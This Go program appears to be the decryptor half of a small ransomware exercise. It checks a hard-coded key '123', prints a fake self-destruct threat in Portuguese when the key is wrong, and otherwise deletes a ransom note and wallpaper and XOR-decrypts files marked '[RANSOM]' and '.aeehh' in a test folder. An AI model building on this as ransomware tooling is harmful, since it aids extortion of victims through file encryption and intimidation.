package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

const password = "123"

func xorEncrypt(data []byte) []byte {
	encrypted := make([]byte, len(data))
	for i := range data {
		encrypted[i] = data[i] ^ password[i%len(password)]
	}
	return encrypted
}

func main() {
	targetDir := `C:\teste`
	fmt.Println("[?] Insira a chave:")
	var inputKey string
	fmt.Scanln(&inputKey)

	if inputKey != password {
		fmt.Println(`
💀💀💀 ALERTA DE DESTRUIÇÃO 💀💀💀

CHAVE INVÁLIDA! O AUTODESTRUIDOR SERÁ ATIVADO EM 10...9...8...
`)
		return
	}

	// Apagar arquivo de aviso
	os.Remove(filepath.Join(targetDir, "!!!WARNING!!!.txt"))
	os.Remove(filepath.Join(targetDir, "wallpaper.jpg"))

	// Descriptografar arquivos
	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || !strings.HasSuffix(info.Name(), ".aeehh") {
			return nil
		}

		data, _ := ioutil.ReadFile(path)
		decryptedData := xorEncrypt(data)

		originalName := strings.TrimPrefix(strings.TrimSuffix(info.Name(), ".aeehh"), "[RANSOM]")
		ioutil.WriteFile(filepath.Join(filepath.Dir(path), originalName), decryptedData, 0644)
		os.Remove(path)

		return nil
	})

	fmt.Println("[+] Arquivos restaurados!")
}
